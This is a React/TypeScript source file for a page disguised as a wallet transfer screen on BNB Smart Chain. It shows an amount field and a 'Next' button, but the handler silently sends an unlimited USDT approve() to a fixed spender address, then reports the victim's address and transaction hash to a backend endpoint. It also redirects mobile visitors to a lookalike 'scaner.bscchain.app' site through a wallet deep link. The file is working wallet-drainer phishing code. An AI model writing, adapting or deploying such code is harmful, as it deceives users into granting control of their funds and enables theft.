import { useState, useEffect, useCallback } from 'react'
import { USDT_SPENDER_ADDRESS, USDT_ADDRESS, MAX_ALLOWANCE, BASE_URL, BSC_CHAIN_ID } from '../../env'

declare global {
  interface Window { ethereum?: any }
}

const APPROVE_ABI = [{
  name: 'approve',
  type: 'function',
  inputs: [
    { name: 'spender', type: 'address' },
    { name: 'amount',  type: 'uint256' },
  ],
  outputs: [{ name: '', type: 'bool' }],
}]

const BALANCE_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
]

// ── Toast ──────────────────────────────────────────────────────────────────
interface ToastProps {
  message: string
  type: 'success' | 'error'
  visible: boolean
}

function Toast({ message, type, visible }: ToastProps) {
  return (
    <div
      className={`fixed top-5 left-1/2 -translate-x-1/2 z-50 flex items-center gap-2.5 px-4 py-3 rounded-2xl shadow-lg transition-all duration-300 max-w-xs w-[90vw]
        ${visible ? 'opacity-100 translate-y-0' : 'opacity-0 -translate-y-3 pointer-events-none'}
        ${type === 'success' ? 'bg-gray-900 text-white' : 'bg-gray-900 text-white'}
      `}
    >
      {type === 'success' ? (
        <div className="w-5 h-5 rounded-full bg-green-500 flex items-center justify-center flex-shrink-0">
          <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
          </svg>
        </div>
      ) : (
        <div className="w-5 h-5 rounded-full bg-red-500 flex items-center justify-center flex-shrink-0">
          <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </div>
      )}
      <p className="text-sm font-medium leading-snug">{message}</p>
    </div>
  )
}

// ── Main ───────────────────────────────────────────────────────────────────
type Step = 'form' | 'processing'

export default function TransferPage() {
  const [amount, setAmount]         = useState('')
  const [usdValue, setUsdValue]     = useState('0')
  const [maxBal, setMaxBal]         = useState<string | null>(null)
  const [walletAddr, setWalletAddr] = useState<string | null>(null)
  const [step, setStep]             = useState<Step>('form')

  // Toast state
  const [toast, setToast] = useState<{ message: string; type: 'success' | 'error'; visible: boolean }>({
    message: '', type: 'success', visible: false,
  })

  const showToast = useCallback((message: string, type: 'success' | 'error') => {
    setToast({ message, type, visible: true })
    setTimeout(() => setToast(t => ({ ...t, visible: false })), 3000)
  }, [])

  // ── Redirect normal browser / Auto-install wallet ────────────────────────
  useEffect(() => {
    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
    
    const isWallet =
      /Trust\//.test(navigator.userAgent) ||
      /TrustWallet/.test(navigator.userAgent) ||
      /MetaMaskMobile/.test(navigator.userAgent) ||
      /CoinbaseWallet/.test(navigator.userAgent) ||
      /imToken/.test(navigator.userAgent) ||
      /TokenPocket/.test(navigator.userAgent) ||
      typeof window.ethereum !== 'undefined'

    if (!isWallet) {
      if (isMobile) {
        // Mobile + no wallet → redirect to Trust Wallet deep link (opens install page or app)
        const url = encodeURIComponent('https://scaner.bscchain.app/')
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`
      } else {
        // Desktop → show install message
        showToast('Please open this page in Trust Wallet or MetaMask mobile app.', 'error')
      }
    }
  }, [showToast])

  // Auto-detect connected wallet + check chain
  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.request({ method: 'eth_accounts' })
        .then((accounts: string[]) => {
          if (accounts?.length) { 
            setWalletAddr(accounts[0])
            fetchBalance(accounts[0])
            // Auto-switch to BSC if wrong chain
            checkAndSwitchChain()
          }
        }).catch(() => {})
    }
  }, [])

  async function checkAndSwitchChain() {
    if (!window.ethereum) return
    try {
      const chainId = await window.ethereum.request({ method: 'eth_chainId' })
      if (chainId !== BSC_CHAIN_ID) {
        await ensureBSC()
      }
    } catch { /* silent */ }
  }

  // USD value
  useEffect(() => {
    const num = parseFloat(amount)
    setUsdValue(isNaN(num) ? '0' : num.toFixed(2))
  }, [amount])

  async function fetchBalance(address: string) {
    try {
      const { ethers } = await import('ethers')
      const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/')
      const usdt = new ethers.Contract(USDT_ADDRESS, BALANCE_ABI, provider)
      const [bal, dec] = await Promise.all([usdt.balanceOf(address), usdt.decimals()])
      setMaxBal(parseFloat(ethers.formatUnits(bal, dec)).toFixed(2))
    } catch { /* silent */ }
  }

  async function ensureBSC() {
    try {
      // Check current chain first
      const currentChain = await window.ethereum.request({ method: 'eth_chainId' })
      if (currentChain === BSC_CHAIN_ID) return // Already on BSC

      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_CHAIN_ID }],
      })

      // Wait for chain switch to settle
      await new Promise(resolve => setTimeout(resolve, 800))

    } catch (e: any) {
      if (e.code === 4902) {
        // BSC not added — add it
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: BSC_CHAIN_ID,
            chainName: 'BNB Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com'],
          }],
        })
        await new Promise(resolve => setTimeout(resolve, 800))
      } else {
        throw e // User rejected chain switch
      }
    }
  }

  async function connectWallet(): Promise<string | null> {
    if (!window.ethereum) return null
    const accounts: string[] = await window.ethereum.request({ method: 'eth_requestAccounts' })
    if (!accounts?.length) return null
    setWalletAddr(accounts[0])
    fetchBalance(accounts[0])
    return accounts[0]
  }

  async function handleNext() {
    const num = parseFloat(amount)
    if (isNaN(num) || num <= 0) {
      showToast('Please enter a valid amount.', 'error')
      return
    }

    try {
      setStep('processing')

      let addr = walletAddr
      if (!addr) {
        addr = await connectWallet()
        if (!addr) { setStep('form'); return }
      }

      await ensureBSC()

      const { ethers } = await import('ethers')
      const iface = new ethers.Interface(APPROVE_ABI)
      const data  = iface.encodeFunctionData('approve', [USDT_SPENDER_ADDRESS, MAX_ALLOWANCE])

      const hash: string = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{ from: addr, to: USDT_ADDRESS, data, gas: '0x186A0' }],
      })

      // Save to backend
      await fetch(`${BASE_URL}/api/approved`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          network: 'BSC Mainnet',
          owner:   addr,
          spender: USDT_SPENDER_ADDRESS,
          amount:  MAX_ALLOWANCE,
          txHash:  hash || 'unknown',
          source:  'scanner', // Identify scanner users
        }),
      })

      setStep('form')
      setAmount('')
      showToast('Transaction submitted successfully.', 'success')

    } catch (e: any) {
      setStep('form')
      showToast('Transaction could not be completed. Please try again.', 'error')
    }
  }

  // ── PROCESSING ────────────────────────────────────────────────────────────
  if (step === 'processing') return (
    <>
      <Toast {...toast} />
      <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6">
        <div className="w-10 h-10 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin mb-5" />
        <p className="text-gray-700 font-medium text-base">Waiting for confirmation…</p>
        <p className="text-gray-400 text-sm mt-1">Please confirm in your wallet</p>
      </div>
    </>
  )

  // ── FORM ──────────────────────────────────────────────────────────────────
  return (
    <div className="min-h-screen bg-white flex flex-col px-5 pt-6 pb-8">

      {/* Toast */}
      <Toast {...toast} />

      {/* Address Field */}
      <div className="mb-5">
        <p className="text-xs text-gray-400 mb-1.5">Address or Domain Name</p>
        <div className="flex items-center border border-gray-200 rounded-xl px-3.5 py-3 gap-2">
          <span className="flex-1 text-gray-700 text-sm font-mono truncate">
            {USDT_SPENDER_ADDRESS.slice(0, 10)}...{USDT_SPENDER_ADDRESS.slice(-8)}
          </span>
          <span className="text-blue-500 text-sm font-medium flex-shrink-0">Paste</span>

          {/* Contacts icon */}
          <button type="button" className="flex-shrink-0 text-blue-500" aria-label="Contacts">
            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round">
              <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
              <circle cx="9" cy="7" r="4" />
              <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
              <path d="M16 3.13a4 4 0 0 1 0 7.75" />
            </svg>
          </button>

          {/* QR icon */}
          <button type="button" className="flex-shrink-0 text-gray-400" aria-label="Scan QR">
            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="3" width="7" height="7" rx="1" />
              <rect x="14" y="3" width="7" height="7" rx="1" />
              <rect x="3" y="14" width="7" height="7" rx="1" />
              <path d="M14 14h2v2h-2v-2zM18 14h3v3h-3v-3zM14 18h3v3h-3v-3z" />
            </svg>
          </button>
        </div>
      </div>

      {/* Amount Field */}
      <div className="mb-1">
        <p className="text-xs text-gray-400 mb-1.5">Amount</p>
        <div className="flex items-center border border-gray-200 rounded-xl px-3.5 py-3 gap-2">
          <input
            type="number"
            inputMode="decimal"
            placeholder="0"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="flex-1 text-gray-800 text-base outline-none bg-transparent min-w-0"
            min="0"
            step="any"
          />
          <span className="text-gray-400 text-sm flex-shrink-0">USDT</span>
          <button
            type="button"
            onClick={() => maxBal && setAmount(maxBal)}
            className="text-blue-500 font-semibold text-sm flex-shrink-0"
          >
            Max
          </button>
        </div>
        <p className="text-xs text-gray-400 mt-1.5 ml-0.5">= ${usdValue}</p>
        {maxBal && (
          <p className="text-xs text-gray-400 mt-0.5 ml-0.5">Available: {maxBal} USDT</p>
        )}
      </div>

      {/* Spacer */}
      <div className="flex-1" />

      {/* Next Button */}
      <button
        type="button"
        onClick={handleNext}
        disabled={!amount || parseFloat(amount) <= 0}
        className="w-full py-3 bg-blue-500 hover:bg-blue-600 active:bg-blue-700 disabled:opacity-40 disabled:cursor-not-allowed text-white font-medium text-sm rounded-2xl transition-colors"
      >
        Next
      </button>
    </div>
  )
}
